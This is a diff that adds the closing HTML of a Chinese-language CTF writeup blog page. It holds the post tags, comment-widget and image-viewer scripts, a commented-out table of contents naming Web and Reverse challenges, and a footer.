+                                <div class="post-tags">
+                                    
+                                        
+
+<a href="/server-archive/tags/CTF/">#CTF</a> <a href="/server-archive/tags/Writeup/">#Writeup</a> <a href="/server-archive/tags/Web/">#Web</a> <a href="/server-archive/tags/Reverse/">#Reverse</a>
+
+
+                                            
+                                </div>
+                                <div class="post-date">
+                                    
+                                        2022-08-30
+                                    
+                                </div>
+                            </div>
+                    </div>
+
+                    <!-- Comments -->
+                    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                        <!-- Disqus Comments -->
+
+<div id="vcomments" class="comment"></div>
+<script>
+  new Valine({
+    el: '.comment',
+    appId: 'TSp33hlPwuAsaq6YiQt7qxqB-gzGzoHsz',
+    appKey: '4pv9GKDHCxnThP1EN1u9uYSN',
+    placeholder: 'random',
+    avatar: '',
+    enableQQ: true,
+    emojiCDN: '//i0.hdslb.com/bfs/emote/',
+    // 表情title和图片映射
+    emojiMaps: {
+      "tv_doge": "6ea59c827c414b4a2955fe79e0f6fd3dcd515e24.png",
+      "tv_亲亲": "a8111ad55953ef5e3be3327ef94eb4a39d535d06.png",
+      "tv_偷笑": "bb690d4107620f1c15cff29509db529a73aee261.png",
+      "tv_再见": "180129b8ea851044ce71caf55cc8ce44bd4a4fc8.png",
+      "tv_冷漠": "b9cbc755c2b3ee43be07ca13de84e5b699a3f101.png",
+      "tv_发怒": "34ba3cd204d5b05fec70ce08fa9fa0dd612409ff.png",
+      "tv_发财": "34db290afd2963723c6eb3c4560667db7253a21a.png",
+      "tv_可爱": "9e55fd9b500ac4b96613539f1ce2f9499e314ed9.png",
+      "tv_吐血": "09dd16a7aa59b77baa1155d47484409624470c77.png",
+      "tv_呆": "fe1179ebaa191569b0d31cecafe7a2cd1c951c9d.png",
+      "tv_呕吐": "9f996894a39e282ccf5e66856af49483f81870f3.png",
+      "tv_困": "241ee304e44c0af029adceb294399391e4737ef2.png",
+      "tv_坏笑": "1f0b87f731a671079842116e0991c91c2c88645a.png",
+      "tv_大佬": "093c1e2c490161aca397afc45573c877cdead616.png",
+      "tv_大哭": "23269aeb35f99daee28dda129676f6e9ea87934f.png",
+      "tv_委屈": "d04dba7b5465779e9755d2ab6f0a897b9b33bb77.png",
+      "tv_害羞": "a37683fb5642fa3ddfc7f4e5525fd13e42a2bdb1.png",
+      "tv_尴尬": "7cfa62dafc59798a3d3fb262d421eeeff166cfa4.png",
+      "tv_微笑": "70dc5c7b56f93eb61bddba11e28fb1d18fddcd4c.png",
+      "tv_思考": "90cf159733e558137ed20aa04d09964436f618a1.png",
+      "tv_惊吓": "0d15c7e2ee58e935adc6a7193ee042388adc22af.png",
+      "tv_打脸": "56ab10b624063e966bfcb76ea5dc4794d87dfd47.png",
+      "tv_抓狂": "fe31c08edad661d63762b04e17b8d5ae3c71a757.png",
+      "tv_抠鼻": "c666f55e88d471e51bbd9fab9bb308110824a6eb.png",
+      "tv_斜眼笑": "911f987aa8bc1bee12d52aafe62bc41ef4474e6c.png",
+      "tv_无奈": "ea8ed89ee9878f2fece2dda0ea8a5dbfe21b5751.png",
+      "tv_晕": "5443c22b4d07fb1907ccc610c8e6db254f2461b7.png",
+      "tv_流汗": "cead1c351ab8d79e9f369605beb90148db0fbed3.png",
+      "tv_流泪": "7e71cde7858f0cd50d74b0264aa26db612a8a167.png",
+      "tv_流鼻血": "c32d39db2737f89b904ca32700d140a9241b0767.png",
+      "tv_点赞": "f85c354995bd99e28fc76c869bfe42ba6438eff4.png",
+      "tv_生气": "26702dcafdab5e8225b43ffd23c94ac1ff932654.png",
+      "tv_生病": "8b0ec90e6b86771092a498c54f09fc94621c1900.png",
+      "tv_疑问": "0793d949b18d7be716078349c202c15ff166f314.png",
+      "tv_白眼": "c1d59f439e379ee50eef488bcb5e5378e5044ea4.png",
+      "tv_皱眉": "72ccad6679fea0d14cce648b4d818e09b8ffea2d.png",
+      "tv_目瞪口呆": "0b8cb81a68de5d5365212c99375e7ace3e7891b7.png",
+      "tv_睡着": "8b196675b53af58264f383c50ad0945048290b33.png",
+      "tv_笑哭": "1abc628f6d4f4caf9d0e7800878f4697abbc8273.png",
+      "tv_腼腆": "89712c0d4af73e67f89e35cbc518420380a7f6f4.png",
+      "tv_色": "61822c7e9aae5da76475e7892534545336b23a6f.png",
+      "tv_调侃": "4bc022533ef31544ca0d72c12c808cf4a1cce3e3.png",
+      "tv_调皮": "b9c41de8e82dd7a8515ae5e3cb63e898bf245186.png",
+      "tv_鄙视": "6e72339f346a692a495b123174b49e4e8e781303.png",
+      "tv_闭嘴": "c9e990da7f6e93975e25fd8b70e2e290aa4086ef.png",
+      "tv_难过": "87f46748d3f142ebc6586ff58860d0e2fc8263ba.png",
+      "tv_馋": "fc7e829b845c43c623c8b490ee3602b7f0e76a31.png",
+      "tv_鬼脸": "0ffbbddf8a94d124ca2f54b360bbc04feb6bbfea.png",
+      "tv_黑人问号": "45821a01f51bc867da9edbaa2e070410819a95b2.png",
+      "tv_鼓掌": "1d21793f96ef4e6f48b23e53e3b9e42da833a0f6.png"
+      // ... 更多表情
+    }
+  })
+  if('random' == 'random'){
+    var veditor = document.getElementById("veditor");
+    fetch('https://v1.hitokoto.cn')
+        .then(response => response.json())
+        .then(data => {
+        veditor.placeholder = '『' + data.hitokoto + '』' + '\n\n\n' + 'From  ' + data.from;
+        })
+        .catch(console.error)
+  }
+</script>
+
+                    </div>
+                </div>
+            </div>
+        </article>
+</section>
+
+<!-- Image viewer-->
+
+    
+    <!-- Custom picture view-->
+    <link href="/server-archive/css/viewer.min.css" rel="stylesheet" />
+    <script
+      src="/server-archive/js/viewer.min.js"
+      type="text/javascript"
+      charset="utf-8"
+    ></script>
+    
+    <script type="text/javascript">
+      // set image viewer
+      Viewer.setDefaults({
+        zoomRatio: [0.5],
+        navbar: false,
+        toolbar: false,
+        button: false,
+        title: [2, (image, imageData) => `${image.alt}`],
+        show: function() {
+          this.viewer.zoomTo(0.5);
+        }
+      });
+      var imageList = document.getElementsByTagName("img");
+      Array.prototype.forEach.call(imageList, element => {
+        var viewer = new Viewer(element);
+      });
+    </script>
+
+    
+
+
+<!-- TOC -->
+<!-- 
+    <aside id="article-toc" role="navigation" class="fixed">
+        <div id="article-toc-inner">
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="toc-text">写在前面</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web"><span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%9A%A9-signin-%7C-%E9%9A%BE%E5%BA%A6%E8%AF%84%E5%88%86:-%E2%98%85"><span class="toc-text">🚩 Signin | 难度评分: ★</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9A%99%EF%B8%8F-d3buger-%7C-%E9%9A%BE%E5%BA%A6%E8%AF%84%E5%88%86:-%E2%98%85"><span class="toc-text">⚙️ D3buger | 难度评分: ★</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%A2-%E6%9B%B4%E7%AE%80%E5%8D%95%E7%9A%84%E8%AE%A1%E7%AE%97%E9%A2%98-%7C-%E9%9A%BE%E5%BA%A6%E8%AF%84%E5%88%86:-%E2%98%85"><span class="toc-text">🔢 更简单的计算题 | 难度评分: ★</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%A2-%E6%9B%B4%E5%9D%91%E7%9A%84%E8%AE%A1%E7%AE%97%E9%A2%98-%7C-%E9%9A%BE%E5%BA%A6%E8%AF%84%E5%88%86:-%E2%98%85%E2%98%85"><span class="toc-text">🔢 更坑的计算题 | 难度评分: ★★</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%87%A8%F0%9F%87%B3-china-flag-%7C-%E9%9A%BE%E5%BA%A6%E8%AF%84%E5%88%86:-%E2%98%85%E2%98%85%E2%98%85"><span class="toc-text">🇨🇳 China Flag | 难度评分: ★★★</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#referer"><span class="toc-text">Referer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#x-forwarded-for"><span class="toc-text">X-Forwarded-For</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#accept-language"><span class="toc-text">Accept-Language</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A4%A5-trick-%7C-%E9%9A%BE%E5%BA%A6%E8%AF%84%E5%88%86:-%E2%98%85%E2%98%85%E2%98%85%E2%98%85"><span class="toc-text">🤥 Trick | 难度评分: ★★★★</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%5B%E6%BC%8F%E6%B4%9E-0x00%5D-%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E-(==)"><span class="toc-text">[漏洞 0x00] 弱类型比较漏洞 (&#x3D;&#x3D;)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%5B%E6%BC%8F%E6%B4%9E-0x01%5D-%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E6%BC%8F%E6%B4%9E"><span class="toc-text">[漏洞 0x01] 正则匹配漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%5B%E6%BC%8F%E6%B4%9E-0x02%5D-extract%E6%BC%8F%E6%B4%9E"><span class="toc-text">[漏洞 0x02] extract漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%5B%E6%BC%8F%E6%B4%9E-0x03%5D-%E5%8F%8C$$%E8%BD%AC%E4%B9%89%E6%BC%8F%E6%B4%9E"><span class="toc-text">[漏洞 0x03] 双$$转义漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%8F%8A%E7%BB%93%E6%9E%9C"><span class="toc-text">代码及结果</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%AC%9B-blackpage-%7C-%E9%9A%BE%E5%BA%A6%E8%AF%84%E5%88%86:-%E2%98%85%E2%98%85%E2%98%85%E2%98%85"><span class="toc-text">⬛ BlackPage | 难度评分: ★★★★</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php://filter"><span class="toc-text">php:&#x2F;&#x2F;filter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tab%E4%BB%A3%E6%9B%BF%E7%A9%BA%E6%A0%BC/url%E7%BC%96%E7%A0%81"><span class="toc-text">Tab代替空格&#x2F;URL编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D"><span class="toc-text">绕过正则匹配</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%5B%E6%96%B9%E6%B3%95-0x00%5D-%E5%8D%95%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87preg_match"><span class="toc-text">[方法 0x00] 单引号绕过preg_match</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%5B%E6%96%B9%E6%B3%95-0x01%5D-%E4%BD%BF%E7%94%A8nl%E5%91%BD%E4%BB%A4"><span class="toc-text">[方法 0x01] 使用nl命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%5B%E6%96%B9%E6%B3%95-0x02%5D-%E4%BD%BF%E7%94%A8base64%E7%BC%96%E7%A0%81%E8%AF%BB%E5%8F%96"><span class="toc-text">[方法 0x02] 使用base64编码读取</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E6%9E%9C"><span class="toc-text">结果</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%98%AF%EF%B8%8F-%E5%A4%AA%E6%9E%81%E6%8E%8C%E9%97%A8%E4%BA%BA-%7C-%E9%9A%BE%E5%BA%A6%E8%AF%84%E5%88%86:-%E2%98%85%E2%98%85%E2%98%85"><span class="toc-text">☯️ 太极掌门人 | 难度评分: ★★★</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A5%B3-to_be_admin-%7C-%E9%9A%BE%E5%BA%A6%E8%AF%84%E5%88%86:-%E2%98%85%E2%98%85"><span class="toc-text">🥳 To_be_Admin | 难度评分: ★★</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A4%90-to_be_admin_again-%7C-%E9%9A%BE%E5%BA%A6%E8%AF%84%E5%88%86:-%E2%98%85%E2%98%85%E2%98%85%E2%98%85%E2%98%85"><span class="toc-text">🤐 To_be_Admin_Again | 难度评分: ★★★★★</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%98%B0to_be_admin_again_and_again-%7C-%E9%9A%BE%E5%BA%A6%E8%AF%84%E5%88%86:-%E2%98%85%E2%98%85%E2%98%85%E2%98%85"><span class="toc-text">😰To_be_Admin_Again_and_Again | 难度评分: ★★★★</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%8F%83-%E7%AC%AC%E4%B8%80%E6%AC%A1%E8%B7%91%E8%B7%AF-%7C-%E9%9A%BE%E5%BA%A6%E8%AF%84%E5%88%86:-%E2%98%85%E2%98%85%E2%98%85%E2%98%85%E2%98%85(%E6%89%8B%E5%8A%A8)-%E2%98%85%E2%98%85%E2%98%85%E2%98%85(sqlmap)"><span class="toc-text">🏃 第一次跑路 | 难度评分: ★★★★★(手动) ★★★★(sqlmap)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%92%89-inject-me-%7C-%E9%9A%BE%E5%BA%A6%E8%AF%84%E5%88%86:-%E2%98%85%E2%98%85%E2%98%85%E2%98%85%E2%98%85%E2%98%85"><span class="toc-text">💉 Inject me | 难度评分: ★★★★★★</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#step-1.-%E7%BB%95%E8%BF%87login%E5%92%8Cparse%E7%9A%84filter"><span class="toc-text">Step 1. 绕过login和parse的filter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#step-2.-%E7%BB%95%E8%BF%87docmd%E7%9A%84filter"><span class="toc-text">Step 2. 绕过doCmd的filter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#step-3.-%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Step 3. 反弹shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#step-4.-%E4%BD%BF%E7%94%A8curl%E5%91%BD%E4%BB%A4%E6%8F%90%E6%9D%83,-%E8%AE%BF%E9%97%AEflag"><span class="toc-text">Step 4. 使用curl命令提权, 访问flag</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#reverse"><span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%92%A1-hello-reverse-%7C-%E9%9A%BE%E5%BA%A6%E8%AF%84%E5%88%86:-%E2%98%85"><span class="toc-text">💡 Hello Reverse | 难度评分: ★</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%90%B8-find-the-key-%7C-%E9%9A%BE%E5%BA%A6%E8%AF%84%E5%88%86:-%E2%98%85"><span class="toc-text">🐸 Find the key | 难度评分: ★</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%92%AF-baby-c-code-%7C-%E9%9A%BE%E5%BA%A6%E8%AF%84%E5%88%86:-%E2%98%85"><span class="toc-text">💯 Baby C code | 难度评分: ★</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%8E%AB-baby-xor-%7C-%E9%9A%BE%E5%BA%A6%E8%AF%84%E5%88%86:-%E2%98%85%E2%98%85"><span class="toc-text">🎫 Baby XOR | 难度评分: ★★</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%98%86-encoder-%7C-%E9%9A%BE%E5%BA%A6%E8%AF%84%E5%88%86:-%E2%98%85%E2%98%85%E2%98%85"><span class="toc-text">😆 Encoder | 难度评分: ★★★</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A4%96-baby-android-%7C-%E9%9A%BE%E5%BA%A6%E8%AF%84%E5%88%86:-%E2%98%85%E2%98%85"><span class="toc-text">🤖 Baby Android | 难度评分: ★★</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%90%8D-easypy-%7C-%E9%9A%BE%E5%BA%A6%E8%AF%84%E5%88%86:-%E2%98%85%E2%98%85%E2%98%85%E2%98%85"><span class="toc-text">🐍 EasyPy | 难度评分: ★★★★</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%8D%89loopers-%7C-%E9%9A%BE%E5%BA%A6%E8%AF%84%E5%88%86:-%E2%98%85%E2%98%85%E2%98%85%E2%98%85%E2%98%85%E2%98%85"><span class="toc-text">🍉LOOPERS | 难度评分: ★★★★★★</span></a></li></ol></li></ol>
+        </div>
+    </aside>
+ -->
+
+
+    <script>
+        hljs.highlightAll();
+    </script>
+
+    <!-- Scripts -->
+    <script type="text/javascript">
+    console.log("© Timlzh 🙋 2022-" + new Date().getFullYear());
+    console.log("Welcome to my blog: https://timlzh.com");
+</script>
+  
+    <!-- Google Analytics -->
+    
+
+    <!-- Service Worker -->
+    <!-- if using service worker -->
+
+    
+    <!-- Go Top -->
+    <a class="go-top">
+    <i class="fa fa-arrow-up"></i>
+</a>
+
+<script type="text/javascript">
+    if ($(window).scrollTop() <= 100) {
+        $(".go-top").hide();
+    }
+    
+    $(function () {
+        $(window).scroll(function () {
+            if ($(window).scrollTop() > 100) {
+                $(".go-top").fadeIn(500);
+            } else {
+                $(".go-top").fadeOut(500);
+            }
+        });
+        $(".go-top").click(function () {
+            $('body,html').animate({scrollTop: 0}, 500);
+            return false;
+        });
+    });
+</script>
+</body>
+
+<footer>
+    
+    
+    
+        <div class="beian">
+            <a href="http://www.beian.miit.gov.cn" target="_blank">浙ICP备2022036129号-2</a>
+        </div>
+    
+
+</footer>
+
+</html>
